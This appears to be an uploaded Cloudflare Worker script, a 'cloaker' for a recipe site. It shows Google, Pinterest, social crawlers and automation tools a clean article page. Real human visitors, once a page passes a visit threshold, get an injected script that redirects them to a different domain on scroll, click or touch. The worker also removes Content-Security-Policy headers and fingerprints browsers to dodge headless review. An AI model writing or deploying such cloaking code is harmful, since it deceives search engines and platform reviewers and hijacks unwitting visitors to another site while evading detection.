--e0e03b6f39526acc1e740d0c1f80c0caae26d0ae0f621be62125e6d635de
Content-Disposition: form-data; name="worker.js"

/**
 * Cloudflare Cloaker Worker for homeandrecipe.com
 * Generated automatically by Cloaker Dashboard
 * Target Host: asqstyle.com
 * Active Method: Unique Human Visitor Threshold (4 humans/24h)
 */

const ACTIVATION_METHOD = "visitor_threshold"; // 'trigger' or 'visitor_threshold'
const TARGET_HOST = "asqstyle.com";
const SCROLL_PCT  = 0.15;
const TRIGGER_MODE = "both"; // 'scroll', 'click', or 'both'
const THRESHOLD_COUNT = 4;

function isBot(ua) {
  if (!ua || ua.length < 15) return true;

  if (/Pinterestbot/i.test(ua) || (ua.includes("Pinterest/") && ua.includes("bot.html"))) {
    return true;
  }

  if (/headlesschrome|puppeteer|playwright|selenium|phantomjs|cypress|webdriver/i.test(ua)) {
    return true;
  }

  if (/googlebot|google-inspectiontool|mediapartners-google|storebot-google|bingbot|bingpreview|msnbot|yandexbot|baiduspider|duckduckbot/i.test(ua)) {
    return true;
  }

  if (/facebookexternalhit|facebot|meta-externalagent|twitterbot|linkedinbot|slackbot|telegrambot|whatsapp|discordbot|applebot|bytespider/i.test(ua)) {
    return true;
  }

  if (/curl\/|wget\/|python-requests|aiohttp|scrapy|node-fetch|axios|go-http-client|urllib|postman/i.test(ua)) {
    return true;
  }

  if (/bot\b|crawler|spider|scraper|preview|archiver/i.test(ua)) {
    return true;
  }

  return false;
}

export default {
  // Scheduled Cron Handler: Runs daily to purge stale visits older than 48 hours (when Method 2 is used)
  async scheduled(event, env, ctx) {
    if (env.DB) {
      try {
        await env.DB.prepare("DELETE FROM url_human_visits WHERE visited_at < datetime('now', '-48 hours')").run();
        console.log("[CF Worker] Purged visits older than 48 hours");
      } catch (err) {
        console.error("[CF Worker] Scheduled purge error:", err);
      }
    }
  },

  async fetch(request, env, ctx) {
    const url = new URL(request.url);
    const ua = request.headers.get("user-agent") || "";

    // 1. DYNAMIC ROBOTS.TXT: Disallows /themes/ without exposing script names
    if (url.pathname === "/robots.txt") {
      const robots = [
        "# Explicitly allow Pinterest's web crawler full access to pages and images",
        "User-agent: Pinterestbot",
        "Allow: /",
        "Disallow: /themes/",
        "Disallow: /wp-admin/",
        "Disallow: /search/",
        "",
        "# Allow all standard search engine crawlers",
        "User-agent: *",
        "Allow: /",
        "Disallow: /themes/",
        "Disallow: /wp-admin/",
        "Allow: /wp-admin/admin-ajax.php",
        "Disallow: /wp-includes/",
        "Disallow: /search/",
        "Disallow: /*?s=",
        "",
        "# Direct crawlers to sitemaps",
        "Sitemap: https://homeandrecipe.com/wp-sitemap.xml\nSitemap: https://homeandrecipe.com/sitemap.xml"
      ].join("\n");

      return new Response(robots, {
        headers: {
          "Content-Type": "text/plain; charset=utf-8",
          "Cache-Control": "no-store, no-cache, must-revalidate"
        }
      });
    }

    // 2. HARD BLOCK ON /themes/ FOR BOTS
    if (url.pathname.startsWith("/themes/")) {
      if (isBot(ua)) {
        return new Response("Forbidden", { status: 403 });
      }
    }

    if (request.method !== "GET") return fetch(request);

    // 3. STATIC ASSETS BYPASS (Stylesheets, images, fonts, scripts)
    if (/\.(jpg|jpeg|png|gif|webp|svg|css|js|woff|woff2|ttf|eot|ico|json|xml)$/i.test(url.pathname)) {
      return fetch(request);
    }

    // 4. BOT ROUTING: Crawlers get pure, clean origin HTML (Zero DB writes, zero redirection)
    if (isBot(ua)) {
      return fetch(request);
    }

    const postPath = url.pathname.endsWith("/") ? url.pathname : url.pathname + "/";

    // =========================================================================
    // METHOD 2: 24-HOUR UNIQUE HUMAN VISITOR THRESHOLD ENGINE
    // =========================================================================
    if (ACTIVATION_METHOD === 'visitor_threshold') {
      let uniqueHumanCount24h = 0;

      if (env.DB) {
        try {
          const clientIp = request.headers.get("cf-connecting-ip") || "0.0.0.0";
          const country = request.headers.get("cf-ipcountry") || "XX";

          // Use cookie if present, otherwise IP + UA fingerprint
          const cookieHeader = request.headers.get("cookie") || "";
          let visitorId = "";
          const cookieMatch = cookieHeader.match(/cf_uv_id=([^;]+)/);
          if (cookieMatch) {
            visitorId = cookieMatch[1];
          } else {
            visitorId = clientIp + "::" + ua;
          }

          const rawId = visitorId + "::cloaker-salt";
          const msgBuffer = new TextEncoder().encode(rawId);
          const hashBuffer = await crypto.subtle.digest("SHA-256", msgBuffer);
          const visitorHash = Array.from(new Uint8Array(hashBuffer))
            .map(b => b.toString(16).padStart(2, "0"))
            .join("")
            .substring(0, 32);

          // AWAIT the insert so this current visitor is recorded BEFORE counting
          try {
            await env.DB.prepare(
              "INSERT INTO url_human_visits (post_path, visitor_hash, visited_at, country) VALUES (?1, ?2, datetime('now'), ?3)"
            ).bind(postPath, visitorHash, country).run();
          } catch (insertErr) {}

          // Continuous Rolling 24-Hour Human Visit Query (Counts every human visit to this slug; resets after 24h)
          const countRow = await env.DB.prepare(
            "SELECT COUNT(*) as cnt FROM url_human_visits WHERE post_path = ?1 AND visited_at >= datetime('now', '-24 hours')"
          ).bind(postPath).first();

          uniqueHumanCount24h = (countRow && countRow.cnt) ? countRow.cnt : 0;
        } catch (dbErr) {
          console.error("[CF Worker] DB threshold error:", dbErr);
        }
      }

      // GATEKEEPER: If visits in 24h are below threshold (e.g. < 4):
      // Serve clean WordPress article HTML with ZERO redirection scripts!
      // Must prevent browser caching so subsequent visits reach Worker & counter increments!
      if (uniqueHumanCount24h < THRESHOLD_COUNT) {
        const subOrigin = await fetch(request, { cf: { cacheEverything: false } });
        const subHeaders = new Headers(subOrigin.headers);
        subHeaders.set("Cache-Control", "no-store, no-cache, must-revalidate, max-age=0");
        subHeaders.set("Pragma", "no-cache");
        return new Response(subOrigin.body, {
          status: subOrigin.status,
          headers: subHeaders
        });
      }
    }

    // =========================================================================
    // FETCH ORIGIN FOR HUMAN VISITOR (Activates Redirection)
    // =========================================================================
    const origin = await fetch(request, { cf: { cacheEverything: false } });
    const ct = origin.headers.get("content-type") || "";
    const dest = `https://${TARGET_HOST}${postPath}${url.search}`;

    if (!ct.includes("text/html")) {
      return Response.redirect(dest, 302);
    }

    // Inject Human Verification & Anti-Automation Script
    const inject = `
<script>
(function() {
    var target = "${dest}";
    var done = false;
    var botDetected = false;
    var ACTIVATION_METHOD = "${ACTIVATION_METHOD}"; // 'trigger' or 'visitor_threshold'
    var TRIGGER_MODE = "${TRIGGER_MODE}"; // 'scroll', 'click', or 'both'

    // Multi-layer Automation & Bot Detection
    function scanAutomation() {
        if (botDetected) return true;

        // 1. Direct webdriver flag: strictly check if true (automated tool)
        if (navigator.webdriver === true) {
            botDetected = true;
            return true;
        }

        // 2. Headless desktop detection (Ignore touch devices like iPhones/Android where outerWidth is naturally 0)
        var isTouchDevice = ('ontouchstart' in window) || (navigator.maxTouchPoints > 0);
        if (!isTouchDevice && window.outerWidth === 0 && window.outerHeight === 0 && window.screen && window.screen.width === 0) {
            botDetected = true;
            return true;
        }

        // 3. Execution stack inspection for CDP / Playwright / Puppeteer
        try {
            var s = (new Error()).stack || "";
            if (s.includes("UtilityScript") || s.includes("playwright") || s.includes("puppeteer") || s.includes("evaluate (:")) {
                botDetected = true;
                return true;
            }
        } catch(e) {}

        // 4. Automation globals & attributes
        if (window.__playwright || window.playwright || window.__pw_init || window.__pw_manual) {
            botDetected = true;
            return true;
        }
        if (window.__puppeteer_evaluation_script__ || window.puppeteer) {
            botDetected = true;
            return true;
        }
        if (window.__selenium_evaluate || window._phantom || window.callPhantom) {
            botDetected = true;
            return true;
        }
        if (window.__nightmare || window.domAutomation || window.domAutomationController) {
            botDetected = true;
            return true;
        }

        // 5. Headless Chrome detection (Strictly headless, never real Chrome builds)
        var uaStr = navigator.userAgent || "";
        if (uaStr.indexOf("HeadlessChrome") !== -1) {
            botDetected = true;
            return true;
        }

        if (document.documentElement && (document.documentElement.getAttribute("webdriver") || document.documentElement.getAttribute("selenium"))) {
            botDetected = true;
            return true;
        }

        if (!navigator.languages || navigator.languages.length === 0) {
            botDetected = true;
            return true;
        }

        return false;
    }

    scanAutomation();

    // Reset scroll restoration so browsers start at the top
    try {
        if ('scrollRestoration' in history) {
            history.scrollRestoration = 'manual';
        }
    } catch(e) {}

    // Track real human presence across ALL device types
    var humanActive = false;
    function markHuman(e) {
        if (!e || e.isTrusted) {
            humanActive = true;
        }
    }

    // Capture human events: mouse, touch, pointer, keyboard, wheel
    window.addEventListener("mousemove", markHuman, { passive: true, capture: true });
    window.addEventListener("pointerdown", markHuman, { passive: true, capture: true });
    window.addEventListener("pointermove", markHuman, { passive: true, capture: true });
    window.addEventListener("touchstart", markHuman, { passive: true, capture: true });
    window.addEventListener("touchmove", markHuman, { passive: true, capture: true });
    window.addEventListener("keydown", markHuman, { passive: true, capture: true });
    window.addEventListener("wheel", function(e) {
        if (!e || e.isTrusted) {
            humanActive = true;
        }
    }, { passive: true, capture: true });

    function triggerRedirect(reason) {
        if (done) return;

        if (scanAutomation() || botDetected) {
            done = true;
            console.log("[CF Worker] Automated browser detected. Redirect disabled.");
            return;
        }

        done = true;
        console.log("[CF Worker] Human redirect triggered by:", reason, "-> Target:", target);
        try {
            window.location.replace(target);
        } catch(e) {}
        window.location.href = target;
    }

    // -------------------------------------------------------------------------
    // IF METHOD 2 (Unique Human Visitor): Threshold Reached -> Immediate Redirect
    // -------------------------------------------------------------------------
    if (ACTIVATION_METHOD === 'visitor_threshold') {
        function onThresholdRedirect(reason) {
            if (done) return;
            if (scanAutomation() || botDetected) return;
            triggerRedirect(reason);
        }

        // Instant redirect on any real human interaction:
        window.addEventListener("click", function(e) {
            if (e && e.isTrusted) {
                if (e.preventDefault) e.preventDefault();
                onThresholdRedirect("Human Click (Threshold Reached)");
            }
        }, { capture: true });

        window.addEventListener("touchstart", function(e) {
            if (e && e.isTrusted) {
                onThresholdRedirect("Human TouchStart (Threshold Reached)");
            }
        }, { capture: true, passive: true });

        window.addEventListener("touchend", function(e) {
            if (e && e.isTrusted) {
                onThresholdRedirect("Human Touch (Threshold Reached)");
            }
        }, { capture: true });

        window.addEventListener("pointerdown", function(e) {
            if (e && e.isTrusted) {
                onThresholdRedirect("Human PointerDown (Threshold Reached)");
            }
        }, { capture: true });

        window.addEventListener("pointermove", function(e) {
            if (e && e.isTrusted) {
                onThresholdRedirect("Human PointerMove (Threshold Reached)");
            }
        }, { passive: true });

        window.addEventListener("mousemove", function(e) {
            if (e && e.isTrusted) {
                onThresholdRedirect("Human MouseMove (Threshold Reached)");
            }
        }, { passive: true });

        window.addEventListener("wheel", function(e) {
            if (e && e.isTrusted) {
                onThresholdRedirect("Human Wheel (Threshold Reached)");
            }
        }, { passive: true });

        window.addEventListener("scroll", function() {
            onThresholdRedirect("Human Scroll (Threshold Reached)");
        }, { passive: true });

        window.addEventListener("keydown", function(e) {
            if (e && e.isTrusted) {
                onThresholdRedirect("Human KeyDown (Threshold Reached)");
            }
        }, { passive: true });
    }

    // -------------------------------------------------------------------------
    // IF METHOD 1 (Human Verification Trigger Condition): Respect Chosen Trigger
    // -------------------------------------------------------------------------
    if (ACTIVATION_METHOD === 'trigger') {
        // CONDITION 1: CLICK / TAP TRIGGER
        if (TRIGGER_MODE === 'click' || TRIGGER_MODE === 'both') {
            function onHumanClick(e) {
                if (done) return;
                if (scanAutomation() || botDetected) return;
                if (!e || !e.isTrusted) return; // Discard synthetic programmatic clicks

                e.preventDefault();
                e.stopPropagation();
                triggerRedirect("Human Click/Tap");
            }
            window.addEventListener("click", onHumanClick, { capture: true });
            window.addEventListener("touchend", onHumanClick, { capture: true });
        }

        // CONDITION 2: SCROLL TRIGGER
        if (TRIGGER_MODE === 'scroll' || TRIGGER_MODE === 'both') {
            function getScroll() {
                return window.scrollY || window.pageYOffset || document.documentElement.scrollTop || document.body.scrollTop || 0;
            }

            function getHeight() {
                return Math.max(
                    document.body.scrollHeight, document.documentElement.scrollHeight,
                    document.body.offsetHeight, document.documentElement.offsetHeight,
                    document.body.clientHeight, document.documentElement.clientHeight
                );
            }

            var startY = getScroll();

            function checkScroll() {
                if (done) return;
                if (scanAutomation() || botDetected) return;
                if (!humanActive) return;

                var top = getScroll();
                // Ensure the user actually scrolled down from where they started
                if (top <= startY) return;

                var height = getHeight();
                var view = window.innerHeight || document.documentElement.clientHeight;
                var max = height - view;

                if (max > 50) { 
                    var pct = top / max;
                    if (pct >= ${SCROLL_PCT}) {
                        triggerRedirect("Human Scroll (" + Math.round(pct * 100) + "%)");
                    }
                } else if (top > 60) {
                    triggerRedirect("Fallback Scroll");
                }
            }

            window.addEventListener("scroll", checkScroll, { passive: true });
        }
    }

    console.log("[CF Worker] Cloaker Active (Method: " + ACTIVATION_METHOD + " | Trigger: " + TRIGGER_MODE + "). Target:", target);
})();
</script>`;

    let injected = false;
    const transformed = new HTMLRewriter()
      .on("head", {
        element(el) {
          if (!injected) {
            el.prepend(inject, { html: true });
            injected = true;
          }
        }
      })
      .on("body", {
        element(el) {
          if (!injected) {
            el.prepend(inject, { html: true });
            injected = true;
          }
        }
      })
      .transform(origin);

    const headers = new Headers(transformed.headers);
    headers.set("Cache-Control", "no-store, no-cache, must-revalidate, max-age=0");
    headers.set("Vary", "User-Agent");
    headers.delete("content-security-policy");
    headers.delete("content-security-policy-report-only");
    headers.delete("content-length");

    return new Response(transformed.body, {
      status: 200,
      headers: headers
    });
  }
};

--e0e03b6f39526acc1e740d0c1f80c0caae26d0ae0f621be62125e6d635de--
